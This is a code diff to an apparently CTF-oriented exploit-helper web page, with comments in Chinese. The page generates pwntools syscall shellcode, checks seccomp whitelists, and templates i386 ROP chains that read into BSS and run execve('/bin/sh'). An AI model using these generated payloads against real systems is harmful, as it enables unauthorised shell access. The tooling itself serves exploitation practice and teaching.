@@ -270,6 +270,7 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
       <div><label class="flabel" for="rop41Len">read 长度（read(0, bss, len) 的 count）</label><input type="text" class="rop-input" id="rop41Len" value="0x100" autocomplete="off" spellcheck="false"></div>
     </div>
     <div class="rop-grid" id="ropG42" style="display:none">
+      <p class="foot" style="grid-column:1/-1;margin:0">以下 5 个 gadget 地址由用户提供、未验证，按当前目标重测后填。</p>
       <div><label class="flabel" for="rop42Binsh">binsh_addr（写入 /bin/sh 的可写 BSS 地址）</label><input type="text" class="rop-input" id="rop42Binsh" value="0x080eb050" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="rop42PopEax">pop_eax_addr（pop eax; ret）</label><input type="text" class="rop-input" id="rop42PopEax" value="0x080b91e6" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="rop42Pop3">pop3_addr（pop edx; pop ecx; pop ebx; ret）</label><input type="text" class="rop-input" id="rop42Pop3" value="0x0806fc30" autocomplete="off" spellcheck="false"></div>
@@ -313,9 +314,9 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
     <ol class="foot" style="padding-left:20px;margin-top:2px">
       <li>\x00 警告已修：生成时实算链字节数与 \x00 数并写入注释与警告区，默认预设实测 4.1 共 88 字节含 21 个 \x00、4.2 共 140 字节含 28 个 \x00（按 4.2 预设 offset=56 计；页面默认 offset 0x20 时为 116 字节、28 个 \x00），gets/strcpy 类输入会在第一个 \x00 处截断。</li>
       <li>两次发送时序已修：4.1 / 4.1a 在两次 io.send 间插 time.sleep，间隔默认 0.3s、可在输入框改，非法输入回退 0.3s。</li>
-      <li>4.2 通用 4 字节分块已修：要写入的字符串默认 /bin/sh，自动补结尾 NUL、按 4 字节分块，任意长度都生成对应写块，默认输出与旧的两行写块逐字相同。</li>
+      <li>4.2 通用 4 字节分块已修：要写入的字符串默认 /bin/sh，自动补结尾 NUL、按 4 字节分块，任意长度都生成对应写块，默认输出与旧的两行写块内容相同（分块前硬编码版）。</li>
       <li>amd64 4.1a / 4.2a 已修：新增两个模板，地址类输入全 0 占位 + SKELETON（read 长度默认 0x100 是长度不是地址），无编造地址；4.1a 是 read→BSS→execve，4.2a 是 8 字节分块写串→execve。</li>
-      <li>单 pop 回退已补全：i386 与 amd64 逐寄存器序列均已写全（见上方回退段），不再只有一句概括。</li>
+      <li>单 pop 回退已补全：i386 与 amd64 逐寄存器序列均已写全（见回退段，本节“没有 pop3 只有单个 pop 的回退”段），不再只有一句概括。</li>
       <li>输入原语提问已修：模板区上方四选一（gets/strcpy 类 / read 定长 / read-recv 循环读 / 还没确认，默认“还没确认”），警告与提示按选择分级。</li>
       <li>4.2 示例地址已标注：5 个 gadget 地址（binsh 0x080eb050、pop_eax 0x080b91e6、pop3 0x0806fc30、mov 0x080557ab、int80 0x0806d7e5）由用户提供、未验证，条件行、生成代码注释、预设 toast 三处均已标注，地址值本身未动。</li>
       <li>4.3 全 0 占位无问题：6 个输入默认全 0，生成代码含 SKELETON 占位说明，本轮未动 4.3 一字节。</li>
@@ -393,6 +394,7 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
 
 <script>
 // 数据：[NR, name, "arg0|arg1|..."]，arg 为表中原文（类型+名），"-" 表示无
+// 字面顺序不保证按号升序，SYS 已排序（L761 按 nr 重排），查表/生成都以 SYS 为准；不要为排字面冒风险重排。
 var RAW=[
 [0,"read","unsigned int fd|char *buf|size_t count"],
 [1,"write","unsigned int fd|const char *buf|size_t count"],
@@ -801,6 +803,7 @@ var ARGS32 = {
 };
 // NR32 口径（Node 实测）：字面 380 条 = 0–386 段 350 条 + 393–423 段 30 条；
 // 0–386 段缺 37 个号：31 个历史号（19 个无实现、12 个旧 ABI）+ 222、223、251、285 共 4 个未分配 + 149、253（有名无实现、调用只返回 -ENOSYS，已删），
+// 19 = 18 空表项（不含 253）+ 134 bdflush；单列对为 149、253。
 // 393–423 段缺 415（未分配）；0–423 未分配空号共 11 个：222、223、251、285、387–392、415。
 // 其后 SYS64.forEach 把 ≥424 共用号 push 进来（49 条，424–472），NR32.length=429；
 // NR32_KEEP 再去重 19 个旧号（16 位版 uid/gid 等），SYS32.length=429-19=410。
@@ -1021,6 +1024,8 @@ function genericHint(sys, an, at){
     return ["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本固定 88（0x58）。填小了内核只认前面的字段，填大了会 EFAULT，别套长度三选一",["88"]];
   if(n==="size" && sys==="openat2")
     return ["fix","结构体大小，不是数据长度：size = sizeof(struct open_how)，固定 24（0x18）。别套长度三选一",["24"]];
+  if(n==="size" && sys==="bpf")
+    return ["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，固定值，按 cmd 查对应结构体的尺寸，别套长度三选一",[]];
   // 4.7) 个数类（nfds/nsops/nsems/nr_*/maxevents…）：是数组/表格里有几个元素，不是字节数，别套长度三选一
   if(/^(nfds|nsops|nsems|nr_events|nr|maxevents|min_nr)$/.test(n) || /^nr_/.test(n))
     return ["cnt","元素个数，不是字节长度：指向的数组/表格里有几个元素就填几（如 poll 的 ufds 数组里有 3 个 pollfd 就填 3，semop 的 sops 数组里有几个操作就填几），必须和你实际准备的元素一一对应。跟数据有多少字节没关系，别套长度三选一",["1","2","3"]];
@@ -1068,7 +1073,8 @@ var RAX_AFTER={
  chmod:"rax = 0 成功 / 负数 = -errno（如 -EPERM 不是属主）",
  mkdir:"rax = 0 成功 / 负数 = -errno（如 -EEXIST 已存在）",
  unlink:"rax = 0 成功 / 负数 = -errno", rename:"rax = 0 成功 / 负数 = -errno",
- chown:"rax = 0 成功 / 负数 = -errno", access:"rax = 0 = 检查通过 / -1 = 不行（看 errno）"
+ chown:"rax = 0 成功 / 负数 = -errno", access:"rax = 0 = 检查通过 / -1 = 不行（看 errno）",
+ bpf:"rax = 返回值是否 fd 取决于 cmd：建 map/prog 的 cmd 返回新 fd，其他 cmd 返回 0 或负的 errno，不是 fd"
 };
 function raxAfter(name){var t=RAX_AFTER[name]||"rax = 返回值（成功 ≥ 0，出错 = 负的 errno）";return archText(t);}
 HINTS["mmap2:addr"]=["fix","固定值：填 0 让内核自己选地址",["0"]];
@@ -1092,6 +1098,7 @@ HINTS["signalfd4:sizemask"]=["fix","固定值，不是长度：sizemask = sizeof
 // clone3 / openat2 的 size 是结构体大小，不是数据长度
 HINTS["clone3:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本（VER2）固定 88（0x58）。填小了内核只认结构体前面的字段，填大了会 EFAULT。本页已默认填 88",["88"]];
 HINTS["openat2:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct open_how) = 24（0x18），固定值。本页已默认填 24",["24"]];
+HINTS["bpf:size"]=["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，固定值，按 cmd 查对应结构体的尺寸（不同 cmd 用的结构体成员不同，尺寸以 man 2 bpf 里该 cmd 的说明为准），别套长度三选一。注意：bpf 的返回值是不是 fd 也取决于 cmd。",[]];
 HINTS["epoll_create:size"]=["fix","遗留参数，不是长度：自 Linux 2.6.8 起 size 已被内核忽略，只要求大于 0（填 0 或负数会 EINVAL），填 1 即可；不要按“要监听几个 fd”去估算，也不要套长度三选一。本页已默认填 1",["1"]];
 // 个数类：是数组/表格的元素个数，不是字节长度，不给长度三选一
 HINTS["poll:nfds"]=["cnt","元素个数，不是字节长度：ufds 数组里有几个 pollfd 就填几，必须和数组一一对应（只查 1 个 fd 就填 1）。跟每个 fd 上有多少数据没关系",["1","2","3"]];
@@ -1170,10 +1177,10 @@ HINTS["listen:backlog"]=["fix","等待队列的个数，不是字节长度：还
 
 var cur=null, chain=[], lastFocus=null;
 var lastLenValue="0x100";
-function isLenName(n, sysName){ n=(n||"").toLowerCase(); if(/vlen|nr_segs|liovcnt|riovcnt|sigsetsize|sizemask|gidsetsize|initval|nfds|nsops|nsems|nr_|maxevents/.test(n)) return false; if((sysName==="eventfd"||sysName==="eventfd2") && n==="count") return false; if((sysName==="clone3"||sysName==="openat2"||sysName==="epoll_create") && n==="size") return false; return /count|len|size|bufsiz|nbytes|msgsz/.test(n); }
+function isLenName(n, sysName){ n=(n||"").toLowerCase(); if(/vlen|nr_segs|liovcnt|riovcnt|sigsetsize|sizemask|gidsetsize|initval|nfds|nsops|nsems|nr_|maxevents/.test(n)) return false; if((sysName==="eventfd"||sysName==="eventfd2") && n==="count") return false; if((sysName==="clone3"||sysName==="openat2"||sysName==="epoll_create"||sysName==="bpf") && n==="size") return false; return /count|len|size|bufsiz|nbytes|msgsz/.test(n); }
 function computePrevLen(){
   for(var k=chain.length-1;k>=0;k--){ var s=chain[k]; if(!s||s.isSave||!s.vals) continue;
-    var so=SYS64.find(function(x){return x.name===s.name;})||SYS.find(function(x){return x.name===s.name;}); if(!so) continue;
+    var so=(arch==="i386" ? SYS.find(function(x){return x.name===s.name;})||SYS64.find(function(x){return x.name===s.name;}) : SYS64.find(function(x){return x.name===s.name;})||SYS.find(function(x){return x.name===s.name;})); if(!so) continue;
     for(var j=0;j<so.args.length;j++){ if(isLenName(argName(so.args[j]), so.name) && s.vals[j] && parseNum(s.vals[j])!==null) return {val:s.vals[j], from:s.name}; }
   }
   return {val:lastLenValue, from:"上一步 read/mmap（示例）"};
@@ -1201,9 +1208,27 @@ function asmVal(v){
   if(/^0o[0-7]+$/i.test(f.trim())) return String(parseNum(f));
   return f;
 }
+// pwntools SYS_ 常量名对照（A-D1/A-D2，buildCode 是唯一用名生成处）：
+// A-D1：i386 的 19 个 *32 调用在 pwntools 里叫 SYS_<名>32（如 SYS_getuid32），本页显示名去掉了 32 后缀，
+//   直接拼 'SYS_getuid' 会拿到旧 16 位版的号（24）；select(142) 在 pwntools 里是 SYS__newselect。只在 i386 下改名，amd64 不动。
+// A-D2：这些调用在 pwntools 里没有 SYS_ 常量，发名字会让 asm() 报错，改发数字 sys.nr（与汇编预览 L1617 用的号一致）。
+//   同名不同号的调用按架构分表（如 pread64：amd64=17，i386=180；timerfd_create：amd64=283，i386=322），不要只按名查一张表。
+var SYS32_SUFFIX32=["lchown","getuid","getgid","geteuid","getegid","setreuid","setregid","getgroups","setgroups","fchown","setresuid","getresuid","setresgid","getresgid","chown","setuid","setgid","setfsuid","setfsgid"];
+var NO_SYS_CONST={
+ amd64:["pread64","pwrite64","timerfd_create","uretprobe","uprobe","close_range","faccessat2","process_madvise","epoll_pwait2","mount_setattr","quotactl_fd","landlock_create_ruleset","landlock_add_rule","landlock_restrict_self","memfd_secret","process_mrelease","futex_waitv","set_mempolicy_home_node","cachestat","fchmodat2","map_shadow_stack","futex_wake","futex_wait","futex_requeue","statmount","listmount","lsm_get_self_attr","lsm_set_self_attr","lsm_list_modules","mseal","setxattrat","getxattrat","listxattrat","removexattrat","open_tree_attr","file_getattr","file_setattr","listns","rseq_slice_yield","fchroot"],
+ i386:["restart_syscall","oldselect","pread64","pwrite64","kexec_load","timerfd_create","statx","arch_prctl","io_pgetevents","rseq","close_range","faccessat2","process_madvise","epoll_pwait2","mount_setattr","quotactl_fd","landlock_create_ruleset","landlock_add_rule","landlock_restrict_self","memfd_secret","process_mrelease","futex_waitv","set_mempolicy_home_node","cachestat","fchmodat2","map_shadow_stack","futex_wake","futex_wait","futex_requeue","statmount","listmount","lsm_get_self_attr","lsm_set_self_attr","lsm_list_modules","mseal","setxattrat","getxattrat","listxattrat","removexattrat","open_tree_attr","file_getattr","file_setattr","listns","rseq_slice_yield","fchroot"]
+};
+function sysHead(sys){
+  if(arch==="i386"){
+    if(sys.name==="select") return "'SYS__newselect'";
+    if(SYS32_SUFFIX32.indexOf(sys.name)>=0) return "'SYS_"+sys.name+"32'";
+    if(NO_SYS_CONST.i386.indexOf(sys.name)>=0) return String(sys.nr);
+  }else if(NO_SYS_CONST.amd64.indexOf(sys.name)>=0) return String(sys.nr);
+  return "'SYS_"+sys.name+"'";
+}
 function buildCode(sys, vals){
   var parts=vals.map(fmtVal);
-  var head="'SYS_"+sys.name+"'";
+  var head=sysHead(sys);
   var body=parts.length?head+", "+parts.join(", "):head;
   return "sc += "+archPath()+".syscall(\n    "+body+"\n)";
 }
@@ -1232,17 +1257,35 @@ function escStr(s){return s.replace(/\\/g,"\\\\").replace(/'/g,"\\'");}
 // 先把 type 从 edi 搬进 edx，之后 edi 才轮到放 data——顺序写死在生成结果里，不依赖 pwntools 的寄存器调度。
 function mountManual32(sys, vals, strs, use){
   var flagsRaw=fmtVal(vals[3]).replace(/'/g,""), dataRaw=fmtVal(vals[4]).replace(/'/g,"");
-  if(/^(edi|ebp|eax|esp)$/.test(flagsRaw)||/^(edi|ebp|eax|esp)$/.test(dataRaw)) return null; // flags/data 用了暂存寄存器，手动顺序保不住，退回普通生成
+  // flags/data 的值本身就在暂存寄存器里（edi/ebp/eax/esp）时，晚搬会被前面的暂存步骤覆盖：
+  // 不再静默退回普通生成——在所有 pushstr/暂存之前先把冲突的值搬走。data 先搬（它可能要读 esi，而 flags 的提前搬运会写 esi），
+  // flags 再搬进 esi（esi 在这之前没人动）；data 若走 edi 暂存位（dir 也要存时）则先暂存 eax（eax 只在最后放调用号，之前没人动），
+  // 等 type 搬进 edx、edi 空出来后再从 eax 搬回 edi。
+  // 顺序反过来会错：flags 的源正好是 data 的暂存目标时，flags 必须先搬；两者互相抢（flags 源 = data 暂存目标，且 data 源 = esi）
+  // 时一次 xchg 同时换好两个值。
+  var flagsBad=/^(edi|ebp|eax|esp)$/.test(flagsRaw);
+  var dataBad=/^(edi|ebp|eax|esp)$/.test(dataRaw)||(flagsBad&&dataRaw==="esi");
   var lines=[];
+  var dDest=use[1] ? "eax" : "edi";
+  var cycle=flagsBad && dataBad && flagsRaw===dDest && dataRaw==="esi";
+  if(cycle){
+    lines.push("sc += 'xchg esi, "+dDest+"\\n'  # flags 与 data 的值正好互为对方的暂存目标：一次 xchg 同时换好，esi 得 flags、"+dDest+" 得 data");
+  } else {
+    if(flagsBad && flagsRaw===dDest) lines.push("sc += 'mov esi, "+(flagsRaw||"0")+"\\n'  # flags 先搬进 esi：它的值在 "+flagsRaw+" 里，晚搬会被暂存步骤覆盖");
+    if(dataBad && !use[1]) lines.push("sc += 'mov edi, "+(dataRaw||"0")+"\\n'  # data 先搬进 edi：它的值在 "+dataRaw+" 里，晚搬会被暂存步骤覆盖（dir 不存时 edi 空闲）");
+    else if(dataBad) lines.push("sc += 'mov eax, "+(dataRaw||"0")+"\\n'  # data 先暂存 eax：它的值在 "+dataRaw+" 里，晚搬会被暂存步骤覆盖；eax 只在最后放调用号");
+    if(flagsBad && flagsRaw!==dDest) lines.push("sc += 'mov esi, "+(flagsRaw||"0")+"\\n'  # flags 先搬进 esi：它的值在 "+flagsRaw+" 里，晚搬会被暂存步骤覆盖");
+  }
   var temp2=use[1] ? "edi" : "ebp"; // type 的暂存：dir 也要存时用 edi（之后先搬进 edx 再放 data），dir 不存时直接用 ebp
   if(use[2]){ lines.push("sc += shellcraft.pushstr('"+escStr(strs[2])+"')"); lines.push("sc += 'mov "+temp2+", esp\\n'  # 暂存 type 指针"); }
   if(use[1]){ lines.push("sc += shellcraft.pushstr('"+escStr(strs[1])+"')"); lines.push("sc += 'mov ebp, esp\\n'  # 保存 dir_name 指针（mount 用不到 ebp）"); }
   if(use[0]) lines.push("sc += shellcraft.pushstr('"+escStr(strs[0])+"')");
   lines.push("sc += 'mov edx, "+(use[2]?temp2:"0")+"\\n'  # type（先搬走，edi 下面要放 data）");
+  if(dataBad && use[1]) lines.push("sc += 'mov edi, eax\\n'  # data（从 eax 搬回来，edi 此时已空出）");
   lines.push("sc += 'mov ecx, "+(use[1]?"ebp":"0")+"\\n'  # dir_name");
   lines.push("sc += 'mov ebx, "+(use[0]?"esp":"0")+"\\n'  # dev_name");
-  lines.push("sc += 'mov esi, "+(flagsRaw||"0")+"\\n'  # flags");
-  lines.push("sc += 'mov edi, "+(dataRaw||"0")+"\\n'  # data");
+  if(!flagsBad) lines.push("sc += 'mov esi, "+(flagsRaw||"0")+"\\n'  # flags");
+  if(!dataBad) lines.push("sc += 'mov edi, "+(dataRaw||"0")+"\\n'  # data");
   lines.push("sc += 'mov eax, "+sys.nr+"\\n'");
   lines.push("sc += 'int 0x80\\n'");
   return lines.join("\n");
@@ -1263,7 +1306,7 @@ function buildFullCode(sys, vals){
       }
       else use[k]=false; // 用户改成了别的寄存器：这个字符串手动处理，其余照常自动压
     }
-    if(arch==="i386" && sys.name==="mount" && use[1] && use[2] && (use[0]||!strs[0])){
+    if(arch==="i386" && sys.name==="mount" && use[2] && (!strs[1] || use[1]) && (use[0]||!strs[0])){
       var man=mountManual32(sys, vals, strs, use);
       if(man) return man;
     }
@@ -1485,10 +1528,21 @@ function normVal(v){ return (v||"").trim().replace(/^'|'$/g,""); }
 function paramViolation(name, vals, strVal){
   var r=paramRules(); if(!hasParamRules()) return null;
   vals=vals||[];
-  if(name==="write" && r.writeFd && normVal(vals[0])!==normVal(r.writeFd))
-    return "write 的 fd="+ (vals[0]||"?") +"，题目只放行 fd="+r.writeFd+"，这步参数会被 seccomp 拦。";
-  if(name==="read" && r.readFd && normVal(vals[0])!==normVal(r.readFd))
-    return "read 的 fd="+ (vals[0]||"?") +"，题目只放行 fd="+r.readFd+"，这步参数会被 seccomp 拦。";
+  // fd 是数字时按数值比（0x1 就是 1，别因写法不同误报）；值是寄存器时静态页面不知道它运行时的值，只能提醒核对，不能断言“会被 seccomp 拦”。
+  function fdMismatch(v, allowed){
+    var uv=parseNum(v), av=parseNum(allowed);
+    if(uv!==null && av!==null) return uv!==av;
+    return normVal(v)!==normVal(allowed);
+  }
+  function fdNote(v, allowed, sysName){
+    if(REGNAMES.indexOf(normVal(v))>=0)
+      return sysName+" 的 fd="+ (v||"?") +"，题目只放行 fd="+allowed+"。静态检查无法确认该寄存器运行时的值，请核对它存的是否就是允许的 fd。";
+    return sysName+" 的 fd="+ (v||"?") +"，题目只放行 fd="+allowed+"，这步参数会被 seccomp 拦。";
+  }
+  if(name==="write" && r.writeFd && fdMismatch(vals[0], r.writeFd))
+    return fdNote(vals[0], r.writeFd, "write");
+  if(name==="read" && r.readFd && fdMismatch(vals[0], r.readFd))
+    return fdNote(vals[0], r.readFd, "read");
   if((name==="open"||name==="openat") && r.openName){
     var fn = strVal!==undefined && strVal!==null ? strVal : (($("strInput")&&$("strInput").value)||"");
     if(fn && fn.indexOf(r.openName)<0) return "要打开的文件名是 '"+fn+"'，题目只放行包含 '"+r.openName+"' 的路径，这步参数会被 seccomp 拦。改文件名或改参数限制再核对题目。";
@@ -1506,17 +1560,35 @@ function parseParamRules(){
   render(); renderChain();
 }
 
+// mmap/mmap2 的 flags/fd 配对交叉校验（只提醒，不改生成）：匿名映射不需要 fd，文件映射 fd=-1 会 EBADF。
+function mmapPairWarning(){
+  if(!cur || (cur.name!=="mmap" && cur.name!=="mmap2")) return null;
+  var vals=currentVals(), fi=-1, di=-1;
+  cur.args.forEach(function(a,j){ var an=argName(a); if(an==="flags") fi=j; if(an==="fd") di=j; });
+  if(fi<0||di<0) return null;
+  var fl=parseNum(vals[fi]); if(fl===null) return null;
+  var fd=(vals[di]||"").trim().replace(/^'|'$/g,"");
+  if((fl & 0x20) && REGNAMES.indexOf(fd)>=0)
+    return "mmap：flags 含 MAP_ANONYMOUS(0x20)，这是匿名映射，不需要 fd——fd 填 -1 就行，现在填的是寄存器 '"+fd+"'，会被内核忽略。";
+  if(!(fl & 0x20) && parseNum(vals[di])===-1)
+    return "mmap：flags 不含 MAP_ANONYMOUS(0x20)，这是文件映射，fd=-1 会 EBADF——填 open 返回的 fd（'"+axReg()+"' 或已保存的寄存器）。";
+  return null;
+}
 function render(){
   if(!cur)return;
   $("genCode").textContent=buildFullCode(cur,currentVals());
   var bad=wlBlocked(cur.nr), gb=$("genCode"), ww=$("wlWarn");
   var pv=paramViolation(cur.name, currentVals());
+  var mw=mmapPairWarning();
   gb.classList.toggle("blocked-code", !!bad);
   if(bad){
-    ww.innerHTML="⛔ <b>seccomp 会拦：</b>SYS_"+cur.name+"（NR "+cur.nr+"）不在你填的白名单里，运行时进程会被 SIGSYS 杀掉或返回 -EPERM。换白名单内的调用，或把这个号加进白名单再核对题目。"+(pv?"<br>⚠ <b>参数也会被拦：</b>"+pv:"");
+    ww.innerHTML="⛔ <b>seccomp 会拦：</b>SYS_"+cur.name+"（NR "+cur.nr+"）不在你填的白名单里，运行时进程会被 SIGSYS 杀掉或返回 -EPERM。换白名单内的调用，或把这个号加进白名单再核对题目。"+(pv?"<br>⚠ <b>参数也会被拦：</b>"+pv:"")+(mw?"<br>⚠ <b>映射配对：</b>"+mw:"");
     ww.classList.add("show");
   } else if(pv){
-    ww.innerHTML="⚠ <b>参数会被拦：</b>"+pv;
+    ww.innerHTML="⚠ <b>参数会被拦：</b>"+pv+(mw?"<br>⚠ <b>映射配对：</b>"+mw:"");
+    ww.classList.add("show");
+  } else if(mw){
+    ww.innerHTML="⚠ <b>映射配对：</b>"+mw;
     ww.classList.add("show");
   } else ww.classList.remove("show");
   if($("asmPreview").style.display!=="none") updateAsmPreview();
@@ -1536,15 +1608,16 @@ function asmPreviewText(sys, vals){
       if(l.indexOf("'mov ")>=0||l.indexOf('"mov ')>=0) lines.push("; "+l.replace("sc += ",""));
     });
   }
+  var movCount=0, skipped=0;
   vals.forEach(function(v,i){
     var av=asmVal(v);
-    if(av===REGS[i]) lines.push("; "+REGS[i]+" 已是 "+av+"（setregs 会跳过这一步，不用再 mov）");
-    else lines.push("mov "+REGS[i]+", "+av);
+    if(av===REGS[i]){ skipped++; lines.push("; "+REGS[i]+" 已是 "+av+"（setregs 会跳过这一步，不用再 mov）"); }
+    else { movCount++; lines.push("mov "+REGS[i]+", "+av); }
   });
   lines.push("mov "+axReg()+", "+sys.nr+(arch==="i386"?"":"  ; SYS_"+sys.name));
   lines.push(arch==="i386" ? "int 0x80" : "syscall");
   lines.push("");
-  lines.push("; 共 "+(vals.length+2)+" 条核心指令（不含 pushstr 展开）。字节长度随立即数/寄存器编码变化，");
+  lines.push("; 共 "+(movCount+2)+" 条核心指令（不含 pushstr 展开）"+(skipped?"，其中 "+skipped+" 条 setregs 已跳过（参数值恰好等于目标寄存器）":"")+"。字节长度随立即数/寄存器编码变化，");
   lines.push("; 本页不能运行 pwntools：真实长度和 asm() 是否报错，在 VM 里跑 print(len(asm(sc))) 确认。");
   return lines.join("\n");
 }
@@ -1587,9 +1660,24 @@ $("asmBtn").addEventListener("click",function(){
 });
 
 // 链
-var FD_PRODUCERS={open:1,openat:1,openat2:1,socket:1,accept:1,accept4:1,dup:1,dup2:1,dup3:1,eventfd:1,eventfd2:1,timerfd_create:1,inotify_init:1,epoll_create:1,epoll_create1:1,memfd_create:1,open_tree:1,fsopen:1,fspick:1,pidfd_open:1,signalfd:1,signalfd4:1,userfaultfd:1,landlock_create_ruleset:1,inotify_init1:1,pidfd_getfd:1,io_uring_setup:1,fanotify_init:1};
+var FD_PRODUCERS={open:1,openat:1,openat2:1,socket:1,accept:1,accept4:1,dup:1,dup2:1,dup3:1,eventfd:1,eventfd2:1,timerfd_create:1,inotify_init:1,epoll_create:1,epoll_create1:1,memfd_create:1,open_tree:1,fsopen:1,fspick:1,pidfd_open:1,signalfd:1,signalfd4:1,userfaultfd:1,landlock_create_ruleset:1,inotify_init1:1,pidfd_getfd:1,io_uring_setup:1,fanotify_init:1,open_by_handle_at:1,perf_event_open:1};
 var ADDR_PRODUCERS={mmap:1,mmap2:1,brk:1,mremap:1,shmat:1};
 function isSaveStep(s){ return s && s.isSave; }
+// 插入保存步时挑寄存器：先看链里已有的保存步占了哪些，再避开后续步骤参数里实际用到的寄存器，
+// amd64 从 r12、r13、r14、r15 里挑第一个未用的，i386 从 esi/edi/ebp 里挑。都占满时回退到第一个候选。
+function pickSaveReg(afterIdx){
+  var cands=arch==="i386" ? ["esi","edi","ebp"] : ["r12","r13","r14","r15"];
+  var used={};
+  chain.forEach(function(s){
+    if(isSaveStep(s)){ var m=/mov\s+([a-z0-9]+),/.exec(s.code||""); if(m) used[m[1]]=1; }
+  });
+  for(var k=afterIdx+1;k<chain.length;k++){
+    var s=chain[k]; if(!s||isSaveStep(s)||!s.vals) continue;
+    s.vals.forEach(function(v){ var r=(v||"").trim().replace(/^'|'$/g,""); if(r) used[r]=1; });
+  }
+  for(var j=0;j<cands.length;j++){ if(!used[cands[j]]) return cands[j]; }
+  return cands[0];
+}
 function saveWarningFor(i){
   var s=chain[i]; if(!s||isSaveStep(s)) return null;
   var kind = FD_PRODUCERS[s.name] ? "fd" : (ADDR_PRODUCERS[s.name] ? (s.name==="brk" ? "堆顶地址" : "映射地址") : null);
@@ -1608,13 +1696,14 @@ function renderChain(){
     var bad=wlBlocked(s.nr);
     var pv=paramViolation(s.name, s.vals||[], s.strVal);
     var sw=saveWarningFor(i);
-    var saveHtml = sw ? '<div class="cs-save">⚠ 这步的'+sw+'只存在 '+axReg()+' 里，下一步一执行就会被覆盖丢掉。如果后面还要用这个'+sw+'，先保存：<button data-save="'+i+'">插入 mov '+ (arch==="i386"?"esi, eax":"r12, rax") +' 保存</button><br>插入后，后面要用这个'+sw+'的步把参数从 \''+axReg()+'\' 改成 \''+(arch==="i386"?"esi":"r12")+'\'，别再填 '+axReg()+'。</div>' : "";
+    var saveReg=sw ? pickSaveReg(i) : null;
+    var saveHtml = sw ? '<div class="cs-save">⚠ 这步的'+sw+'只存在 '+axReg()+' 里，下一步一执行就会被覆盖丢掉。如果后面还要用这个'+sw+'，先保存：<button data-save="'+i+'">插入 mov '+ saveReg +', '+axReg() +' 保存</button><br>插入后，后面要用这个'+sw+'的步把参数从 \''+axReg()+'\' 改成 \''+saveReg+'\'，别再填 '+axReg()+'。</div>' : "";
     return '<div class="chain-step'+(bad?" blocked":"")+(pv?" param-blocked":"")+'"><div class="cs-head"><span class="cs-title">第 '+(i+1)+" 步 · "+s.name+" ("+s.nr+')</span><button data-del="'+i+'" aria-label="删除">✕</button></div><div class="cs-code">'+s.code.replace(/\n/g," ")+'</div><div class="cs-rax">执行完 → '+s.rax+(bad?' &nbsp;<span class="wl-bad">⛔ 不在白名单里，seccomp 会拦这步</span>':"")+(pv?' &nbsp;<span class="wl-bad" style="color:#d97706">⚠ 参数超限：'+pv+"</span>":"")+"</div>"+saveHtml+"</div>";
   }).join("");
   box.querySelectorAll("button[data-del]").forEach(function(b){b.addEventListener("click",function(){chain.splice(+b.dataset.del,1);renderChain();});});
   box.querySelectorAll("button[data-save]").forEach(function(b){b.addEventListener("click",function(){
     var i=+b.dataset.save;
-    var reg = arch==="i386" ? "esi" : "r12";
+    var reg = pickSaveReg(i);
     chain.splice(i+1,0,{isSave:true,name:"__save",nr:null,code:"sc += 'mov "+reg+", "+axReg()+"\\n'  # 保存上一步的返回值，后面要用它时填 '"+reg+"' 不要填 '"+axReg()+"'",rax:axReg()+" 不变，"+reg+" = 刚才保存的值",vals:[],strVal:""});
     renderChain(); toast("已插入保存步，后面要用时改填 '"+reg+"'");
   });});
@@ -1683,7 +1772,7 @@ function wlGenChain(){
     {label:"§open → "+mmName+" → write（映射文件再输出）", needs:["§open",mmName,"write"]},
     {label:"§open → read → write（经典 ORW）", needs:["§open","read","write"]},
     {label:"§open → sendfile（内核直接转发，不用 read/write 缓冲）", needs:["§open","sendfile"]},
-    {label:"execve（直接拿 shell，不读 flag 文件）", needs:["execve"]}
+    {label:"execve（拿 shell，不读 flag 文件）", needs:["execve"]}
   ];
   cands.forEach(function(c){
     c.missing=[];
@@ -1901,7 +1990,7 @@ function ropGen(){
       "# 第二段 execve(bss, 0, 0)：eax=11，edx=0，ecx=0，ebx=bss",
       "# 注意 pop3 弹出顺序是 edx, ecx, ebx，所以 flat 里 pop3 后面按 edx, ecx, ebx 的值排",
       "# \\x00 警告：这条链共 "+total41+" 字节，含 "+z41+" 个 \\x00（调用号 3/11、长度、0 参数都会带 \\x00）；gets/strcpy 类输入会在第一个 \\x00 处截断",
-      "# 没有 pop3？见下方“单个 pop 回退”：逐个 pop 设寄存器，别硬套 pop3 模板",
+      "# 没有 pop3？见本节“没有 pop3 只有单个 pop 的回退”段：逐个 pop 设寄存器，别硬套 pop3 模板",
       "chain = flat(b'A'*offset_to_ret, pop_eax_addr, 3, pop3_addr, "+len+", bss_addr, 0, int80_addr,",
       "             pop_eax_addr, 11, pop3_addr, 0, 0, bss_addr, int80_addr)",
       "io.send(chain)                 # 先发链",
@@ -1943,7 +2032,7 @@ function ropGen(){
       "p = b'A'*offset_to_ret",
       "# 写 \""+str42+"\"（"+(str42.length+1)+" 字节含结尾 \\x00，自动按 4 字节分块，共 "+chunks42.length+" 块）",
       "# \\x00 警告：这条链共 "+total42+" 字节，含 "+z42+" 个 \\x00；gets/strcpy 类输入会在第一个 \\x00 处截断",
-      "# 没有 pop3？见下方“单个 pop 回退”：逐个 pop 设寄存器，别硬套 pop3 模板"
+      "# 没有 pop3？见本节“没有 pop3 只有单个 pop 的回退”段：逐个 pop 设寄存器，别硬套 pop3 模板"
     ];
     chunks42.forEach(function(c,k){
       var addr=(bn!==null ? "0x"+(bn+4*k).toString(16) : "binsh_addr+"+(4*k));
